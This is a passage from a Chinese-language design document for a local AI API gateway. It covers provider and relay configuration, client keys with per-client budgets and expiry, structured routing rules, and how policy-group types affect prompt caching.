  level: info
  capture_body: true

# ── 出站代理（§3.7）─────────────────────────────────
proxies:
  - name: airport
    type: socks5h             # socks5 | socks5h | http | https
    addr: 127.0.0.1:7890
                              # direct 和 system 是内置的，不用声明

# ── 上游供应商 ──────────────────────────────────────
providers:
  - name: anthropic-official
    protocol: anthropic       # anthropic | openai-chat | openai-responses | gemini | bedrock
    base_url: https://api.anthropic.com
    key: sk-ant-api03-xxxxxxxx
    proxy: airport            # 默认 direct
    timeouts:                 # 分段，见 §4.7。整体超时默认无限
      connect: 10s
      first_byte: 60s
      idle: 60s
    trust: official           # official | untrusted，影响 §5.2 的处置力度

  - name: relay-cn
    protocol: anthropic
    base_url: https://xxx.example.com
    key: ${RELAY_CN_KEY}      # 也可以用环境变量
    trust: untrusted
    model_map:                # 上游模型名不一致时重写
      claude-sonnet-4-5-*: claude-sonnet-4.5
    pricing: relay-cn.yaml    # 中转站价格和官方不同
    billing: per-token        # per-token | subscription | unknown，见 §4.3.1

  - name: relay-1m            # 支持 1M 上下文的中转
    protocol: anthropic
    base_url: https://yyy.example.com
    key: ${RELAY_1M_KEY}
    trust: untrusted
    model_map:
      claude-sonnet-4-5-*: claude-sonnet-4.5-1m

  - name: ollama
    protocol: openai-chat
    base_url: http://127.0.0.1:11434
    proxy: direct             # 本地服务，走代理必挂
    billing: subscription     # 本地跑，边际成本为零

# ── 策略组 ──────────────────────────────────────────
groups:
  - name: sonnet-pool
    type: fallback            # select | fallback | url-test | load-balance | cheapest
    providers: [anthropic-official, relay-cn]
    health_check: { enabled: false }   # 默认惰性。周期探测会破坏「空闲零开销」，见 §4.5
    breaker:      { failure_threshold: 5, recovery: 60s }

  - name: long-ctx-pool
    type: fallback
    providers: [relay-1m, anthropic-official]

  - name: cheap-pool
    type: cheapest
    providers: [relay-cn, ollama]

# ── 路由：自上而下，首个命中决定去向 ──────────────────
routes:
  - name: 超长上下文只有那家能吃
    when: { input_tokens: ">200k" }
    to: long-ctx-pool

  - name: 带缓存的必须走官方，不然白付钱
    when: { cache: true }
    to: anthropic-official

  - name: 多模态别交给中转
    when: { image: true }
    to: anthropic-official

  - name: 简单活儿本地跑
    when: { model: claude-haiku-*, input_tokens: "<4k", tools: false }
    to: ollama

  - name: 这个会话烧太多了，降级继续
    when: { session_cost: ">$3" }
    to: cheap-pool
    set: { thinking: false }

  - name: 超预算不拒绝，换便宜模型
    when: { budget: { exceeded: daily } }
    to: cheap-pool
    set: { model: claude-haiku-4-5, thinking: false }

  - name: 走中转的一律脱敏          # 横切策略，只加 guard 不改去向
    when: { provider_would_be: relay-cn }
    guard: { redact: [api-keys, private-keys], inspect_tools: enforce }

  - name: 兜底                       # 无 when，必须有且只有一条
    to: sonnet-pool

# ── 预算 ────────────────────────────────────────────
budgets:                      # 按客户端的预算写在 clients 段里，见上
  - { scope: global, period: daily, limit_usd: 20, on_exceed: degrade }
  - { scope: provider:relay-cn, period: monthly, limit_usd: 100, on_exceed: block }

# ── 客户端：一把密钥一套待遇（§3.3.1）──────────────────
#    模型列表从上游探测推导，不用手写（§3.9）
clients:
  - { name: claude-code, key: tw-xxxxxxxxxxxx }   # 不写 allow 则按方言自动过滤
  - { name: codex,       key: tw-yyyyyyyyyyyy }
  # 同一种客户端也能开多把，工作和个人项目分开算账
  - { name: cc-work,     key: tw-work11111111 }

  # 局域网场景：限模型、限花费、限并发、限期
  - name: 借给同事用一周
    key: tw-zzzzzzzzzzzz
    allow: [claude-haiku-*]
    budget: { period: daily, limit_usd: 0.5 }
    max_concurrent: 2
    expires_at: 2026-09-15

# ── 安全：三态，默认观察，见 §5.0 ─────────────────────
security:
  redact:        observe      # off | observe | enforce
  inspect_tools: observe
  scan_configs:  observe

# ── 数据保留 ────────────────────────────────────────
retention: { metadata: 90d, bodies: 7d, max_disk: 2GB }
```

### 3.3.1 客户端身份：怎么区分谁是谁

前面反复说「按客户端过滤」「按客户端路由」，但没讲清楚**我们到底怎么知道这个请求是谁发的**。补上，因为它是路由（§3.4）和模型列表（§3.9）的共同前提。

#### 一把密钥认一个人

每个客户端一把独立的网关密钥。首次运行时自动生成：

```yaml
clients:
  - { name: claude-code, key: tw-a1b2c3d4e5f6 }
  - { name: codex,       key: tw-g7h8i9j0k1l2 }
  - { name: my-script,   key: tw-m3n4o5p6q7r8 }
```

`tw-` 前缀是刻意的：一眼就能看出这是我们发的，不是某个上游的真 API key。用户在客户端配置里看到它时不会误以为自己的 key 泄漏了。

#### 完整链路，四步

**一、生成。** 首次运行（§7.6）为检测到的每个客户端各生成一把，写进 `config.yaml` 的 `clients` 段。

**二、分发。** 接管时（§7.11）把对应的那把写进客户端自己的配置：

| 客户端 | 写到哪 |
|---|---|
| Claude Code | `~/.claude/settings.json` 的 `env.ANTHROPIC_AUTH_TOKEN` |
| Codex | `~/.codex/config.toml` 里 `env_key` 指向的环境变量 |
| Zed / opencode / … | 各自配置里的 key 字段 |

**三、识别。** 请求进来时从这几个位置读，**四种都要支持**：

```
Authorization: Bearer tw-xxx     ← Anthropic 的 AUTH_TOKEN 走这条
x-api-key: tw-xxx                ← Anthropic 的 API_KEY 走这条
x-goog-api-key: tw-xxx           ← Gemini
?key=tw-xxx                      ← Gemini 的 query 参数
```

前两条的区别在 §7.11 讲过：客户端设 `ANTHROPIC_AUTH_TOKEN` 就发 Bearer，设 `ANTHROPIC_API_KEY` 就发 `x-api-key`。**只认一种的话，用户手动配过另一种就会撞 401。**

查表得到 client，这个身份从管线第 1 步（identify）一直带到最后。

**四、用起来。** 认出是谁之后，四个地方都要用：

| 用在哪 | 怎么用 |
|---|---|
| 模型过滤（§3.9） | 这个客户端能看到哪些模型 |
| 路由条件（§3.4） | `when: { client: claude-code }` |
| 请求列表（§7.8） | 每条请求标出是谁发的 |
| 成本归因（§4.3） | 谁花了多少钱 |

#### 身份和旁证是两件事，分成两列存

M4 加了一个 `client_hint`：从请求头猜出来的客户端标识。它和上面那个身份**必须分得很开**：

| | 依据 | 能不能伪造 | 用来做什么 |
|---|---|---|---|
| **身份**（`client`） | 网关密钥 | 不能 | 鉴权、路由、配额、成本归因 |
| **旁证**（`client_hint`） | 请求头 | **能** | 只用来显示、和判断「接管生效了吗」 |

**绝不能拿旁证做鉴权或路由决策**——那等于把 `when: { client: x }` 变成一个任何人发个头就能满足的条件。

那为什么还要它？因为 §0.6 说了，本项目是为「一个 key 就够」的人设计的。**那种用户的所有客户端共用同一把钥匙**，于是 `client` 这一列对五个客户端是同一个值；而接管之后的观察窗口（§7.11）要回答的恰恰是「**Codex** 那边生效了吗」。没有旁证，那个问题答不了。

判据都是本机嗅探器实测的：我们接管 Codex 时自己写进去的 `X-ThinkWatch-Client` 头、Codex 自带的 `originator: codex_exec`、以及 `User-Agent` 里的 `claude-cli` / `codex_` / `opencode` 这些。认不出来就是「认不出来」——猜错比不猜更糟，观察窗口会因此宣布「已生效」。

数据库里也是两列，不是覆盖同一列：**一个不可伪造、一个可以伪造，混成一列之后就再也分不清某一行的可信度了。**

#### 为什么不用 URL 路径

cc-switch 用路径前缀区分——`/claude/`、`/codex/`、`/gemini/`。这个做法有四个问题：

| 问题 | 说明 |
|---|---|
| **路径不是身份** | 任何人都能构造那个路径，没有任何验证。它是「我猜你是谁」不是「我确认你是谁」 |
| **每个客户端的地址不一样** | 配错了很难查，而且用户得记住哪个客户端该填哪个路径 |
| **加客户端要改路由表** | 我们这边是加一行配置 |
| **同种客户端的多个实例分不开** | 见下，这是个实际会遇到的场景 |

最后一条值得展开：**密钥能区分同一种客户端的多个实例**。

比如你想给工作项目和个人项目的 Claude Code 各配一把 key：

```yaml
clients:
  - { name: cc-work,     key: tw-work111111 }
  - { name: cc-personal, key: tw-personal22 }
```

然后分别在两个项目的 `.claude/settings.json` 里写不同的 key。这样：

- 请求列表里能分开看
- 成本能分开算
- 路由可以不同（工作项目走稳的，个人项目走便宜的）

**路径前缀做不到这件事**，因为两个 Claude Code 发出的请求路径完全一样。

#### 密钥是身份，而身份是所有策略的绑定点

初稿我写「密钥是识别，不是路由」。**那个说法在单机场景下对，但一到局域网就站不住。**

准确的框架是：**key → 身份 → 挂在这个身份上的一整套策略。**

| 策略 | 作用 | 必须吗 |
|---|---|---|
| **准入** | 没有有效 key 就 401 | **必须。**这是门禁 |
| **可见性** | 能看到哪些模型（§3.9） | 默认按方言自动过滤，不用配 |
| **待遇** | 路由、预算、并发、有效期 | 单机常常用不上，**局域网必需** |

单机场景下你可能只用到第一件，所以会觉得「key 就是个门禁」。但一旦监听地址不是 loopback（§5.4），第三件立刻变成核心——**那时 key 就是「给谁什么待遇」的唯一抓手**。

#### 局域网场景：一把 key 一套待遇

```yaml
clients:
  - name: 我的笔记本
    key: tw-xxxxxxxxxxxx
    # 什么都不限

  - name: 家里那台
    key: tw-yyyyyyyyyyyy
    allow: [claude-haiku-*, claude-sonnet-*]
    budget: { period: daily, limit_usd: 2 }
    max_concurrent: 2

  - name: 借给同事用一周
    key: tw-zzzzzzzzzzzz
    allow: [claude-haiku-*]
    budget: { period: daily, limit_usd: 0.5 }
    expires_at: 2026-09-15         # 到期自动失效
```

配合路由规则，还能让不同的人走不同的上游：

```yaml
routes:
  - name: 别人用我的网关，走便宜的
    when: { client: 借给同事用一周 }
    to: cheap-pool
```

**`expires_at` 值得单独说**：临时把网关借给别人时，到期自动失效比「记得回头删掉」可靠得多。**忘记回收的临时授权，是所有共享场景里最常见的漏洞。**

#### 过期之后：失效，但不删

**core 不会自动删掉过期的条目。** 这条要定死，因为它牵扯一个更大的原则。

§3.8 说过：配置文件是用户的资产，**我们的每一次写入都必须是用户触发的**。程序在后台悄悄删掉几行配置，正好违反这一条——用户某天 `git diff` 发现少了东西，不知道是谁干的、什么时候干的。

所以行为是**失效但保留**：

| | 行为 |
|---|---|
| 那把 key | **立刻失效**，之后一律 401 |
| 配置文件里的条目 | **原样留着**，一个字节不动 |
| UI 上 | 标成「已过期」，给「续期」和「删除」两个按钮 |
| 正在跑的请求 | **让它跑完**，不中途掐断；新请求才拒绝 |

保留还有两个实际好处：**能一键续期**（删了就得重新配一遍），以及**留下审计痕迹**（「我上个月借给谁过」这个信息有用）。

#### 过期判断不需要定时任务

每次请求时比一下 `expires_at` 就够了，纯内存操作。**不要起一个定时器去扫描**——那违反 §4.5 的「没有请求时不做任何周期性工作」，而且毫无必要：一个过期且没人用的 key 不构成任何问题。

代价是**不会主动通知你「某个 key 过期了」**。告警发生在下次有人撞上它的时候，错误信息说清楚是过期而不是密钥错误（§4.6.1 那条「两种失败原因要区分」）。

如果确实想清理，UI 上给一个入口，列出所有过期条目让用户批量删——**用户触发，符合原则**。顺带可以标出「这把从来没被用过」，那种大概率是配了之后对方没用，删起来毫无顾虑。

#### 时区要写清楚

`expires_at` 支持两种写法：

```yaml
expires_at: 2026-09-15                    # 本地时区当天结束（23:59:59）
expires_at: 2026-09-15T18:00:00+08:00     # 精确时刻
```

简单场景好写，需要精确时也能表达。**不接受裸的 UTC 日期**——那会让「我说的 15 号」和「程序理解的 15 号」差出八小时，而这种偏差在借用场景下正好卡在最尴尬的时候。

#### 这补上了一个真实缺口

初稿的预算（§3.3）只有全局和按 provider 两个维度：

```yaml
budgets:
  - { scope: global, period: daily, limit_usd: 20 }
  - { scope: provider:relay-cn, period: monthly, limit_usd: 100 }
```

**缺了按客户端。** 而 §4.7 的并发上限同样只有全局和 per-provider。这两个缺口在单机下无所谓（就你一个人用），**一开局域网就立刻暴露**：某台机器上的失控脚本能把你整天的额度吃光，而你没有任何手段限制它。

所以 `client` 要成为预算和限流的一个 scope。写在 `clients` 段里比写进 `budgets` 更顺手——**同一个身份的所有策略集中在一处**，不用在两个地方对着看。

#### 策略绑在 name 上，不是绑在 key 上

一个实现约束：**key 是可以轮换的**（泄漏了要换、定期轮换是好习惯），而策略和历史统计不该跟着一起丢。

所以内部用 `name` 做主键，`key` 只是它的一个可变属性：

```yaml
  - name: 家里那台          # ← 稳定的身份，策略和历史都挂在这上面
    key: tw-新换的密钥      # ← 可以随时换，不影响上面
```

换 key 之后，历史请求记录、成本统计、预算计数全都还在。**这一条不定死的话，第一次轮换密钥就会把统计打断。**

#### 但路由规则里 `client` 仍然只是众多条件之一

上面说的是「身份能挂策略」，不是「路由必须按身份配」。§3.4 那张匹配维度表里有十几个条件——模型、上下文长度、是否带工具、会话花了多少、时段——`client` 只是其中一个：

```yaml
routes:
  # 完全不看客户端
  - name: 超长上下文走支持 1M 的
    when: { input_tokens: ">200k" }
    to: long-ctx-pool

  # 只看客户端
  - name: 借出去的一律走便宜的
    when: { client: 借给同事用一周 }
    to: cheap-pool
```

**单机自用时，路由规则里可能一次都不出现 `client`**，那完全正常。它是在你需要区别对待的时候才登场的。

#### 不认识的密钥怎么办

**拒绝，不要当成匿名客户端放行。**

| 情况 | 行为 |
|---|---|
| 没带密钥 | 401，错误信息说明去哪拿（§4.6.1） |
| 带了但不认识 | 401，明确说「这个密钥不认识」而不是笼统的认证失败 |
| 带了且认识 | 放行，身份 = 那个 client |

第二种要和第一种区分开，因为它们的原因完全不同：没带是「你还没配」，不认识是「你配错了，或者配置被改过」。给同一个错误信息会让人排查半天。

### 3.4 路由：从零配置到精细规则

#### 三层，按需加深

写规则之前先说清楚一件事：**很多人根本不需要写规则。**

**层 0 · 只配 provider**

```yaml
providers:
  - name: anthropic-official
    protocol: anthropic
    base_url: https://api.anthropic.com
    key: sk-ant-xxxxxxxx

  - name: relay-cn
    protocol: anthropic
    base_url: https://xxx.example.com
    key: ${RELAY_CN_KEY}
```

没有 `groups`，没有 `routes`。行为是：**所有请求按声明顺序做故障转移**——第一个健康的就用它，挂了才切下一个。

这是最小可用配置，**而且对不少人就够了**。「官方为主，挂了走中转」这个需求，零规则就能满足。

**层 1 · 加路由规则，按请求特征分流**

```yaml
routes:
  - name: opus 走官方，贵但稳
    when: { model: claude-opus-* }
    to: anthropic-official        # ← 直接指 provider

  - name: 兜底
    to: relay-cn
```

**`to` 可以直接指向一个 provider**，不需要先建组。这一点很重要——大多数分流需求到这一层就解决了，不必引入策略组这个概念。

**层 2 · 用策略组，让多个 provider 表现得像一个**

```yaml
groups:
  - name: sonnet-pool
    type: fallback
    providers: [anthropic-official, relay-cn]

routes:
  - name: sonnet 走池子，自动容错
    when: { model: claude-sonnet-* }
    to: sonnet-pool
```

**什么时候才需要组**：你想要「多个 provider 作为一个整体」的行为——故障转移、健康检查、负载均衡、按价格选。如果只是「这类请求走 A、那类走 B」，层 1 就够了。

**实现上没有两套逻辑**

层 0 不是特例。内部把它当成：**自动生成一个包含全部 provider 的 `fallback` 组，加一条指向它的兜底规则**。所以引擎只有一条代码路径，用户看到的却是「不配也能跑」。

---

#### 多个上游支持同一个模型时，默认走哪个

这是个必须明确回答的问题。§3.9 的推导会得出这样的映射：

```
claude-sonnet-4-5  →  anthropic-official, relay-cn, relay-hk
```

三家都能提供，一个请求进来走哪个？

**默认是故障转移，不是负载均衡**

按声明顺序，第一个健康的就用它。**这个默认值不是出于保守，理由很硬：**

> **负载均衡会摧毁 prompt cache。**

缓存是按 provider 隔离的——不同的端点、不同的账号，各自维护各自的缓存。一个长会话如果每轮随机跳到不同的家，**缓存永远命中不了**。

而 §4.4 说过，缓存命中与否成本差 **5 到 10 倍**。所以随机分流的代价可能是**账单翻几倍**，换来的收益是「分散负载」——**而单用户桌面场景根本没有需要分散的负载**。

这笔账在任何情况下都不划算，所以它不该是默认值。

**那什么时候该用负载均衡**

一个正当场景：**你有多个等价的账号**。比如同一家中转站开了三个号，为的是绕开单账号的限流。这时候三个 provider 除了 key 不同其余完全一样，轮着用是合理的。

但即使这时也**必须开会话粘滞**（§3.5 已经写了）：同一个会话固定走同一个号，缓存才能保住。

```yaml
groups:
  - name: relay-accounts
    type: load-balance
    providers: [relay-a, relay-b, relay-c]
    session_affinity: true        # 必须，否则缓存全废
```

**各种组类型对缓存的影响**

这张表要在 UI 上直接显示，因为它决定了用户的账单：

| 类型 | 缓存 | 说明 |
|---|---|---|
| `fallback` | ✅ 友好 | 稳定走第一个，缓存持续命中。**默认** |
| `select` | ✅ 友好 | 手动指定，不会自己跳 |
| `load-balance` | ⚠️ 取决于配置 | **必须开会话粘滞**，否则缓存全废 |
| `url-test` | ⚠️ 不稳定 | 会因为延迟变化而跳家，缓存跟着断 |
| `cheapest` | ⚠️ 不稳定 | 会因为价格或可用性变化而跳 |

后三种在 UI 上选中时要给一句提示：**「这个策略可能让 prompt cache 失效，长会话的成本会上升」**。不要让用户为了省 20% 的单价，付出丢掉 90% 缓存折扣的代价。

**一个例外：首字节前的故障转移不影响缓存**

§4.2 说过首字节前可以透明切换 provider。那种切换是**故障驱动**的（这家挂了），不是**策略驱动**的（轮到你了）。

区别在于频率：故障是偶发的，切过去之后会稳定待在新的那家；而负载均衡是每次都跳。所以故障转移不构成缓存问题。

---

#### 规则语法：按 AI 请求的性质来，不照搬流量代理

初稿这里是错的。我把 Clash 的 `TYPE,VALUE,TARGET` 语法整个搬了过来，连 `AND,((MODEL,claude-haiku-*),(TOKENS-LT,4000)),ollama` 这种括号嵌套都照抄了。那东西写不出来也读不懂，更重要的是**它的形状是为「匹配目标地址」设计的，而我们要匹配的是请求的性质**。

网络代理的规则回答「这个连接去哪个 IP」。AI 网关的规则要回答的是：**这次调用是个什么样的活儿，该交给谁干，要不要动它的参数。**

这是两件不同的事，语法也该不同。

#### 结构化条件，不是逗号分隔的字符串

```yaml
routes:
  - name: 超长上下文只有那家能吃
    when:
      input_tokens: ">200k"
    to: long-ctx-pool

  - name: 带缓存的必须走官方，不然白付钱
    when:
      cache: true
    to: anthropic-official

  - name: 简单活儿本地跑，一分钱不花
    when:
      model: claude-haiku-*
      input_tokens: "<4k"
      tools: false
    to: ollama

  - name: 兜底
    to: sonnet-pool
```

四个改进，每个都针对上面那套的具体毛病：

| 改进 | 为什么 |
|---|---|
| **`when` 是结构化对象** | 编辑器能按 schema 补全和校验。字符串 DSL 做不到，写错了只有运行时才知道 |
| **同一个 `when` 里多个条件默认 AND** | 覆盖了九成需求，`AND` 关键字和括号嵌套直接消失 |
| **每条规则有 `name`** | 日志里、UI 里、试算结果里都能引用它。「命中第 4 条」远不如「命中『带缓存的必须走官方』」有用 |
| **比较写成 `">200k"`** | 比 `TOKENS-GT,200000` 好读，而且 `200k` 这种写法本来就是大家在说 token 数时的习惯 |

需要 OR 的时候用 `any_of`，但它应该很少出现——如果你频繁需要 OR，通常说明该拆成两条规则：

```yaml
  - name: 这两家的多模态都不可靠
    when:
      image: true
      provider_would_be:
        any_of: [relay-cn, relay-1m]
    to: anthropic-official
```

#### 匹配维度：AI 请求真正的那些属性

一次 AI 调用携带的信息，比一个 TCP 连接丰富得多。下面这些里，**没有一个在网络代理里存在对应物**：

| 条件 | 例子 | 为什么值得路由 |
|---|---|---|
| `model` | `claude-opus-*` | 最基本的分流 |
| `input_tokens` | `">200k"` `"<4k"` | 上下文长度直接决定了谁能接、多少钱 |
| `max_tokens` | `">8k"` | 要求长输出的活儿，慢且贵 |
| `tools` | `true` / `false` | 很多中转的工具调用不可靠 |
| `tool_count` | `">20"` | 带 50 个工具定义和带 2 个，成本差一个量级 |
| `image` | `true` | 多模态是中转站的重灾区 |
| `cache` | `true` | 见下方单独说明 |
| `thinking` | `true` | **扩展思考的 token 单独计费且很贵**，值得单独路由 |
| `stream` | `false` | 非流式请求可以放心做故障转移（§4.2） |
| `client` | `claude-code` | 谁发的：Claude Code、Cursor、还是某个脚本 |
| `dialect` | `openai-responses` | 入站方言。有些方言只有特定上游支持 |
| `turn` | `">30"` | **会话第几轮**。第 50 轮的上下文和第 1 轮完全不是一回事 |
| `session_cost` | `">$2"` | **这个会话已经花了多少**，防单个任务失控 |
| `budget` | `exceeded: daily` | 预算状态 |
| `time` | `00:00-08:00` | 时段 |
| `header` | `x-foo: bar` | 逃生舱 |

`thinking`、`turn`、`session_cost`、`tool_count` 这四个是初稿完全没有的，而它们恰恰是最「AI」的维度——它们描述的是这次对话的形态，不是这个连接的目的地。

`session_cost` 尤其实用：一个 Claude Code 任务陷入反复试错时，成本会失控。一条规则就能兜住：

```yaml
  - name: 这个会话烧太多了，降级
    when:
      session_cost: ">$3"
    to: cheap-pool
```

#### `cache` 值得单独说

Anthropic 的 prompt caching 能省九成成本，但只在官方端点生效。把带 `cache_control` 的请求路由到不支持缓存的中转站，等于把最大的省钱手段直接扔掉——而且你不会察觉，因为请求照样成功返回。

这条规则是整套配置里性价比最高的一条。

#### 动作不只是「去哪」

这是和流量代理最本质的分歧。Clash 的规则只能决定走哪个 proxy，因为它能做的就是转发字节。我们在协议层，能改的东西多得多：

```yaml
routes:
  - name: 超预算了不拒绝，降级继续干
    when:
      budget: { exceeded: daily }
    to: cheap-pool
    set:
      model: claude-haiku-4-5      # 换个便宜模型
      thinking: false              # 关掉扩展思考

  - name: 走中转的一律脱敏
    when:
      provider_would_be: relay-cn
    guard:
      redact: [api-keys, private-keys]
      inspect_tools: enforce       # 见 §5.2

  - name: 这种活儿直接不让干
    when:
      model: claude-opus-*
      client: some-script
    deny: "脚本不允许调用 Opus"
```

四种动作：

| 动作 | 作用 |
|---|---|
| `to` | 路由到某个 provider 或策略组 |
| `set` | **改写请求参数**：模型、`max_tokens`、是否思考 |
| `guard` | **这条路径上的安全策略**（§5），按目的地差异化 |
| `deny` | 直接拒绝，带一句给客户端看的原因 |

`set` 让「降级」成为可能，而不是只能「拒绝」。预算超了自动换便宜模型继续干活，比直接报错有用得多——这是流量代理根本无法表达的东西，因为它不理解载荷。

#### 但降级有个反直觉的代价：它会作废整个 prompt cache

**换模型等于换缓存命名空间。** 注意这和 §3.9 说的「改个对外名字」不是一回事——那个不影响缓存，因为发给上游的名字没变；这里是真的换了一个模型。

§4.4 说过缓存命中与否成本差 5 到 10 倍，而「预算超了」恰恰最容易发生在一个已经跑了很久、缓存已经暖好的长会话里。

在这种时刻把模型从 Sonnet 换成 Haiku，缓存全部失效，接下来每一轮都要重新付全价的输入 token。**很可能比不降级还贵。**

所以：

- **UI 上必须显示「预计因缓存失效增加 $X」**，而不是只说「已降级为省钱」。
- 提供 `only_at_session_start: true`：只在新会话开始时应用这条 `set`，跑到一半不动它。**长会话场景下这应该是默认值。**
- 换 provider 同理（§3.5 已经提过粘滞），只是 `set: {model}` 更隐蔽——它看起来只是改了个参数。

`thinking: false` 是否也改变缓存前缀，需要在实现时实测确认。如果是，同样受这条约束。

#### 求值顺序：两阶段，因为 `provider_would_be` 是循环依赖

`provider_would_be` 这个条件有个绕不开的问题：它要等路由决定完、策略组内选出具体 provider、跳过熔断的成员之后才知道值——**而 `guard` 又必须在请求发出去之前生效**。一阶段求值解不了这个环。

所以分两阶段：

```
阶段一 · 只跑「请求属性」规则（model / tokens / tools / cache / …）
   ↓  首个命中的决定 to 和 deny
选出策略组 → 组内按策略选出具体 provider → 跳过熔断中的
   ↓
阶段二 · 只跑含 provider_would_be 的规则
   ↓  这类规则【只允许 set / guard / deny，不允许 to】
发出请求
```

**「含 `provider_would_be` 的规则不允许带 `to`」这条禁令是必需的**——允许的话就直接成环了。校验阶段（§3.8 的语义校验）要把它挡下来。

两个阶段内部都是：自上而下，首个命中决定 `to` 和 `deny`；`set` 和 `guard` 从所有命中的规则**累积**，后面的覆盖前面的同名字段（`guard` 的累积还受 §5.1 的「只能收紧」约束）。

**故障转移后要重算阶段二。** §4.2 说首字节前可以透明换 provider——换完之后 `provider_would_be` 的值变了，`guard` 必须重新求值。否则「走中转的一律脱敏」这条规则，在从官方故障转移到中转时会漏掉，而那正是最需要它的时刻。

兜底规则（没有 `when` 的那条）必须存在且只能有一条，放在阶段一的最后。

### 3.5 策略组类型

**默认是 `fallback`**（§3.4）。不配 `type` 就是它，而且**不配 group 时也是它**——引擎会把全部 provider 当成一个隐式的 fallback 组。

| 类型 | 行为 | 缓存 |
|---|---|---|
| `select` | 手动指定，UI 上点选或托盘里切 | ✅ |
| `fallback` | 按配置顺序，跳过熔断中和不健康的 | ✅ |
| `url-test` | 选最快的。**优先用真实流量的统计**，样本不足时用零成本的 L1 补，见 §4.6 | ⚠️ |
| `load-balance` | 轮询或按 session 一致性哈希 | ⚠️ 必须开粘滞 |
| `cheapest` | 按目标模型的实际单价选最便宜的 | ⚠️ |

**带 ⚠️ 的三种会让 prompt cache 不稳定**，UI 上选中时要给提示（§3.4）——不要让用户为了省 20% 的单价，付出丢掉 90% 缓存折扣的代价。

> **五种都实现了**（2026-09-10）。分成两步是这一节最重要的一个结构决定：
>
> - **引擎只给集合**（`expand_group`），它是纯函数、可试算；
> - **顺序在数据面定**（`order_by`），因为后三种要运行时的数字：会话
>   指纹、实测 TTFB、每家的单价。
>
> 试算页（§7.11）走的是**同一个 `order_by`、同一份延迟表和价目表** ——
> 各算各的话，两边迟早会不一样，而那时试算比没有更糟。
>
> 判据分别是：
>
> | | 靠什么排 | 排不出来的那些 |
> |---|---|---|
> | `url-test` | 真实流量的 TTFB **中位数**（窗口 32、至少 3 个样本），启动时用一次零成本的 L1 握手垫底 | **排最后。**「没测到」不等于「慢」，但排前面就等于放弃了「选最快的」这个承诺；排最后它仍然是故障转移的备选 |
> | `cheapest` | 输入单价，输出单价只做同价时的次序 | 同上。**「最便宜」是一句关于钱的承诺** —— 挑一个不知道多少钱的，完全可能是最贵的那个 |
> | `load-balance` | 会话指纹取模。**粘滞默认开** | 认不出会话时**钉住第一家，不轮转** |
>
> 三件写的时候才知道的：
>
> **一、`load-balance` 之前根本没在均衡。**引擎给出集合，而没有任何一层
> 去转它 —— 实测 6 个请求 6 次落在第一家，和 `fallback` 一模一样。而 M1
> 的记录里它写着「✅ 做完了」。**一个宣称做完、实际什么都没做的功能，
> 比一个没做的功能危险**：用户会以为流量分散了。现在有一条回归测试专门
> 盯这件事。
>
> **二、`cheapest` 需要「每家自己的价」，否则它没有判据。**同一个模型在
> 官方和中转站算出来是同一个价的话，排序毫无意义。所以 §4.3.0 的用户覆盖
> 文件加了一层 `providers:` 块。`billing: subscription` 的那家边际成本是
> 零，它就是最便宜的；而 `billing: unknown` 不是「免费」，它排最后。
>
> **三、粘滞这件事上，默认值和降级路径都要站在缓存那边。**这一条改了
> 三处，每一处单独看都像小事，合起来决定的是账单：
>
> 1. **`session_affinity` 默认开。**它原来默认关，而字段上方那行注释
>    自己写着「必须开」—— 也就是说写 `type: load-balance` 不加那一行，
>    缓存就全废了。**不写这一行的人正是不知道这件事的人**，而默认关掉
>    是让他默默付那笔钱。想要纯轮询的写一句 `session_affinity: false`，
>    那是个明确的选择。
> 2. **认不出会话时钉住第一家，不要轮转。**用户开粘滞是在说「别在一次
>    对话里换家」；认不出这条属于哪次对话就去轮转，做的正好是他要求的
>    反面。钉住会让这部分流量集中在一家，但**不均衡是看得见的，缓存
>    失效不是**。（实际上 `fingerprint` 只在 system 和首条 user 都为空
>    时才返回 None，真实请求几乎不会。）
> 3. **槽位用自己写的 FNV-1a，不用 `DefaultHasher`。**后者是 std 的
>    SipHash，文档明说不保证跨版本稳定 —— 它一变，所有正在进行的会话
>    会在同一时刻集体换家，**一次性作废全部 prompt cache**，而现场表现
>    只是「今天账单突然高了」，没有任何东西指向一次 Rust 升级。有一条
>    测试把这个映射冻住了，期望值是用另一份实现独立算的。
>
> 顺带纠正一个假警报：`hurts_cache` 原来按**策略类型**判，看不见粘滞
> 开没开，也没区分 `cheapest`。现在按**这个组的实际配置**判 ——
> `load-balance` 开着粘滞就不伤缓存；`cheapest` 的单价在一次对话里不会
> 变，顺序是稳的，它换家的时机和 `fallback` 一样；只有 `url-test` 真的
> 会随实测延迟中途换家。**没有风险的时候要说「安全」**（§0.6）。
>
> 实测：配置里**一个字都没写** `session_affinity`，同一次会话 12 轮
> 12 次落在同一家。
>
> **中位数而不是 EWMA**：用户问「为什么切到乙了」，EWMA 只能给一个被历史
> 加权过的数，对应不到任何一次真实请求。中位数返回的永远是一个**真实发生
> 过的值**，能在请求列表里找到它 —— 和 §4.3 的分位数用最近秩法同一条理由。
> （§4.3 那轮说「EWMA 有意不做」，理由是它没有消费者；现在 `url-test`
> 就是消费者，而消费者要的是能解释的数。）
>
> 实测（三家假上游，乙 20ms、丙 150ms、甲 300ms）：`load-balance` 9 个
> 请求 3/3/3；开粘滞后两次会话各 9 轮，一次全落甲、一次全落丙；
> `url-test` 30 个请求 24 个落在最快的乙（前几个在采样）；`cheapest`
> 配上 5 折的丙之后 6/6 落丙，把甲改成订阅制之后 6/6 落甲。

`load-balance` 的 session 粘滞是必须的：同一个会话跳到不同供应商，prompt cache 全部失效，成本反而暴涨。

实现上，前四种可以直接用企业版 `strategy.rs` 的权重计算（纯函数，零依赖）。**但 `cheapest` 要自己写**——那个文件的文档注释宣传了 cost 策略，枚举里其实没有，代码里还有一行断言明确要求 `"cost"` 解析失败。所以按单价选最便宜这件事，企业版从来没做过。

---

### 3.6 凭据类型与上游网关接入

原方案默认「凭据 = 一个静态 API key」，这个假设太窄。真实世界至少有四类，provider 抽象必须把凭据做成一个独立维度。

```yaml
providers:
  # 1. 静态 key —— 最常见，直接写（§3.2）
  - name: anthropic-official
    key: sk-ant-api03-xxxxxxxx

  # 2. 无凭据 —— 本地模型
  - name: ollama
    key: none

  # 3. OAuth —— 带自动刷新
  - name: some-oauth-upstream
    key:
      oauth:
        access:   ya29.xxxxxxxx
        refresh:  1//0exxxxxxxx
        endpoint: https://.../token
        refresh_before: 5m     # 提前量，避免边界上打到过期 token

  # 4. 上游网关 —— sub2api / OneAPI / new-api 这类账号池
  - name: sub2api-local
    protocol: anthropic
    base_url: http://127.0.0.1:8080
    key: tw-xxxxxxxxxxxx
    billing: subscription      # 见 §4.3.1
    session_affinity: header:session_id
    forward_headers: [session_id]
```

